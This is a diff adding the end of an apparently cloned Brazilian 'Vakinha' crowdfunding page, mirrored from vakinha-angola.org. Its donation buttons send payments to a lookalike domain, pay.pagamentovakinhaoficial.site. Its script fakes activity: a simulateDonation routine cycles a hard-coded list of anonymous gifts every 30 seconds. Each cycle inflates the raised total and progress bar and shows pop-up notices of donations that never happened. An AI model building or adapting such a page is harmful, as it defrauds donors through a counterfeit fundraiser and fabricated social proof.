+                                <div class="col-6 col-12-sm mb-3" style="padding: 0 5px !important;">
+                    <div class="donation-option position-relative ">
+                                                <a href="https://pay.pagamentovakinhaoficial.site/0CX1nW?amount=150" class="donation-link" target="_blank" rel="noopener">
+                            R$ 150,00                        </a>
+                    </div>
+                </div>
+                                <div class="col-6 col-12-sm mb-3" style="padding: 0 5px !important;">
+                    <div class="donation-option position-relative highlight">
+                                                    <span class="popular-badge">
+                                <svg viewBox="0 0 512 512"><path d="M256 0C236.6 0 219.3 14.25 214.4 33.75C...z"></path></svg>
+                                Mais escolhido
+                            </span>
+                                                <a href="https://pay.pagamentovakinhaoficial.site/0CX1nW?amount=200" class="donation-link" target="_blank" rel="noopener">
+                            R$ 200,00                        </a>
+                    </div>
+                </div>
+                                <div class="col-6 col-12-sm mb-3" style="padding: 0 5px !important;">
+                    <div class="donation-option position-relative ">
+                                                <a href="https://pay.pagamentovakinhaoficial.site/0CX1nW?amount=300" class="donation-link" target="_blank" rel="noopener">
+                            R$ 300,00                        </a>
+                    </div>
+                </div>
+                                <div class="col-6 col-12-sm mb-3" style="padding: 0 5px !important;">
+                    <div class="donation-option position-relative ">
+                                                <a href="https://pay.pagamentovakinhaoficial.site/0CX1nW?amount=400" class="donation-link" target="_blank" rel="noopener">
+                            R$ 400,00                        </a>
+                    </div>
+                </div>
+                                <div class="col-6 col-12-sm mb-3" style="padding: 0 5px !important;">
+                    <div class="donation-option position-relative ">
+                                                <a href="https://pay.pagamentovakinhaoficial.site/0CX1nW?amount=500" class="donation-link" target="_blank" rel="noopener">
+                            R$ 500,00                        </a>
+                    </div>
+                </div>
+                                <div class="col-6 col-12-sm mb-3" style="padding: 0 5px !important;">
+                    <div class="donation-option position-relative ">
+                                                <a href="https://pay.pagamentovakinhaoficial.site/0CX1nW?amount=600" class="donation-link" target="_blank" rel="noopener">
+                            R$ 600,00                        </a>
+                    </div>
+                </div>
+                                <div class="col-6 col-12-sm mb-3" style="padding: 0 5px !important;">
+                    <div class="donation-option position-relative ">
+                                                <a href="https://pay.pagamentovakinhaoficial.site/0CX1nW?amount=700" class="donation-link" target="_blank" rel="noopener">
+                            R$ 700,00                        </a>
+                    </div>
+                </div>
+                                <div class="col-6 col-12-sm mb-3" style="padding: 0 5px !important;">
+                    <div class="donation-option position-relative ">
+                                                <a href="https://pay.pagamentovakinhaoficial.site/0CX1nW?amount=800" class="donation-link" target="_blank" rel="noopener">
+                            R$ 800,00                        </a>
+                    </div>
+                </div>
+                                <div class="col-6 col-12-sm mb-3" style="padding: 0 5px !important;">
+                    <div class="donation-option position-relative ">
+                                                <a href="https://pay.pagamentovakinhaoficial.site/0CX1nW?amount=1000" class="donation-link" target="_blank" rel="noopener">
+                            R$ 1000,00                        </a>
+                    </div>
+                </div>
+                
+                            </div>
+        </div>
+    </div>
+
+    <!-- Modal: Outro valor -->
+    <div class="modal" id="otherValueModal" aria-hidden="true">
+        <div class="fora-modal" onclick="closeOtherValueModal()"></div>
+        <div class="modal-content" tabindex="-1" role="dialog" aria-modal="true" aria-label="Outro valor">
+            <button class="close-modal" onclick="closeOtherValueModal()" aria-label="Fechar">×</button>
+            <h3>Outro Valor</h3>
+            <p>Digite o valor que deseja doar</p>
+            <input type="text" id="moneyInput" class="border border-gray-300 rounded w-100 py-2 px-3 text-center" placeholder="R$ 0,00" maxlength="15">
+            <div class="d-flex flex-wrap justify-content-center my-2">
+                                    <button type="button" class="border-2 px-3 py-1 rounded text-sm fw-semibold m-1" data-value="100">R$ 100</button>
+                                    <button type="button" class="border-2 px-3 py-1 rounded text-sm fw-semibold m-1" data-value="250">R$ 250</button>
+                                    <button type="button" class="border-2 px-3 py-1 rounded text-sm fw-semibold m-1" data-value="500">R$ 500</button>
+                                    <button type="button" class="border-2 px-3 py-1 rounded text-sm fw-semibold m-1" data-value="1000">R$ 1.000</button>
+                                    <button type="button" class="border-2 px-3 py-1 rounded text-sm fw-semibold m-1" data-value="3000">R$ 3.000</button>
+                            </div>
+            <button class="btn-primary" id="submitValueBtn">CONTRIBUIR AGORA!</button>
+        </div>
+    </div>
+
+    <script src="../cdn.jsdelivr.net/npm/jquery%403.6.0/dist/jquery.min.js"></script>
+    <script src="../cdn.jsdelivr.net/npm/swiper%409.3.2/swiper-bundle.min.js"></script>
+    <script src="../cdn.jsdelivr.net/npm/bootstrap%405.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        new Swiper('.galeria', {
+            pagination: { el: '.swiper-pagination', clickable: true },
+            loop: true,
+            autoplay: { delay: 5000, disableOnInteraction: false },
+        });
+
+        const video = document.getElementById('mainVideo');
+        const canvas = document.getElementById('videoPoster');
+        const playButton = document.getElementById('playButton');
+        if (video && canvas && playButton) {
+            video.addEventListener('loadeddata', () => {
+                video.currentTime = 0;
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    video.setAttribute('poster', canvas.toDataURL('image/jpeg'));
+                }, 100);
+            });
+            playButton.addEventListener('click', () => {
+                if (video.paused) {
+                    video.muted = false;
+                    video.play();
+                    playButton.innerHTML = '<svg viewBox="0 0 24 24"><path d="M6 4h4v16H6zM14 4h4v16h-4z" fill="currentColor"></path></svg>';
+                } else {
+                    video.pause();
+                    playButton.innerHTML = '<svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z" fill="currentColor"></path></svg>';
+                }
+            });
+        }
+
+        function openDonateModal() {
+            document.getElementById('donateModal').style.display = 'flex';
+            document.querySelector('#donateModal .modal-content').focus();
+        }
+        function closeDonateModal() {
+            document.getElementById('donateModal').style.display = 'none';
+        }
+        function openOtherValueModal() {
+            closeDonateModal();
+            document.getElementById('otherValueModal').style.display = 'flex';
+            document.querySelector('#otherValueModal .modal-content').focus();
+        }
+        function closeOtherValueModal() {
+            document.getElementById('otherValueModal').style.display = 'none';
+        }
+
+        document.querySelectorAll('.close-modal, .btn-ajudar, .donation-link, .btn-primary').forEach(btn => {
+            btn.addEventListener('keydown', e => {
+                if (e.key === 'Enter' || e.key === ' ') {
+                    e.preventDefault();
+                    btn.click();
+                }
+            });
+        });
+
+        const moneyInput = document.getElementById('moneyInput');
+        function toBRL(v) {
+            v = v.replace(/\D/g, '');
+            if (!v) return '';
+            v = (parseInt(v) / 100).toFixed(2).replace('.', ',');
+            return v.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
+        }
+        if (moneyInput) {
+            moneyInput.addEventListener('input', e => {
+                const pos = e.target.selectionEnd;
+                e.target.value = 'R$ ' + toBRL(e.target.value);
+                e.target.selectionEnd = pos + 1;
+            });
+        }
+        document.querySelectorAll('[data-value]').forEach(btn => {
+            btn.addEventListener('click', () => {
+                if (!moneyInput) return;
+                moneyInput.value = 'R$ ' + toBRL(btn.getAttribute('data-value') + '00');
+            });
+        });
+
+        document.getElementById('submitValueBtn').addEventListener('click', () => {
+            const raw = (moneyInput?.value || '').replace(/\D/g, '');
+            if (!raw) {
+                alert('Digite um valor válido');
+                return;
+            }
+            const amount = parseInt(raw) / 100;
+            if (amount < 1) {
+                alert('O valor mínimo é R$ 1,00');
+                return;
+            }
+            let url = '';
+            url += (url.includes('?') ? '&' : '?') + 'amount=' + Math.floor(amount);
+                        window.open(url, '_blank', 'noopener');
+            closeOtherValueModal();
+        });
+
+        document.querySelectorAll('.menu-detalhes li').forEach(tab => {
+            tab.addEventListener('click', () => {
+                document.querySelectorAll('.menu-detalhes li').forEach(t => t.classList.remove('active'));
+                document.querySelectorAll('.tabcontent').forEach(c => c.style.display = 'none');
+                tab.classList.add('active');
+                document.getElementById(tab.dataset.tab).style.display = 'block';
+            });
+        });
+
+        const donationQueue = [
+            { name: 'Anônimo', amount: 30 },
+            { name: 'Anônimo', amount: 75 },
+            { name: 'Anônimo', amount: 100 },
+            { name: 'Anônimo', amount: 60 },
+            { name: 'Anônimo', amount: 150 },
+        ];
+        let currentRaised = parseFloat('1.392,12'.replace(/\./g, '').replace(',', '.')) || 0;
+        const metaVal = parseFloat('4.500,00'.replace(/\./g, '').replace(',', '.')) || 0;
+
+        function updateProgress() {
+            const raisedAmount = document.querySelectorAll('.arrecadado h2, .arrecadacaoMobile strong');
+            const progressBars = document.querySelectorAll('.barraParcial');
+            const progressLabels = document.querySelectorAll('.porcentagem');
+            const pct = metaVal > 0 ? Math.min((currentRaised / metaVal) * 100, 100) : 0;
+            raisedAmount.forEach(el => el.textContent = 'R$ ' + currentRaised.toLocaleString('pt-BR', { minimumFractionDigits: 2 }));
+            progressBars.forEach(bar => bar.style.width = pct.toFixed(0) + '%');
+            progressLabels.forEach(label => label.textContent = pct.toFixed(0) + '%');
+        }
+
+        function addDonationCard(name, amount) {
+            const donationCard = document.createElement('div');
+            donationCard.className = 'donation-card d-flex justify-content-between py-2';
+            donationCard.innerHTML = `<span>${name}</span><span>R$ ${amount.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>`;
+            const container = document.querySelector('.tabcontent#quem-ajudou');
+            if (container) container.prepend(donationCard);
+        }
+
+        function showToast(msg) {
+            const toast = document.createElement('div');
+            toast.className = 'notificacao';
+            toast.innerHTML = `<div class="avatar"><img src="/images/perfil.png" alt="User"></div><div class="content">${msg}</div>`;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.classList.add('show'), 100);
+            setTimeout(() => {
+                toast.classList.remove('show');
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }
+
+        let donationIndex = 0;
+        function simulateDonation() {
+            if (donationIndex >= donationQueue.length) donationIndex = 0;
+            const d = donationQueue[donationIndex];
+            currentRaised += d.amount;
+            updateProgress();
+            showToast(`${d.name} doou R$ ${d.amount.toLocaleString('pt-BR')}`);
+            addDonationCard(d.name, d.amount);
+            donationIndex++;
+            setTimeout(simulateDonation, 30000);
+        }
+
+        setTimeout(simulateDonation, 5000);
+      
+    </script>
+     
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"da63f9d8cee24de3931e4da98b7cf5a6","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+
+<!-- Mirrored from vakinha-angola.org/HS3MPCowMFlW by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 14 Nov 2025 15:06:58 GMT -->
+</html>
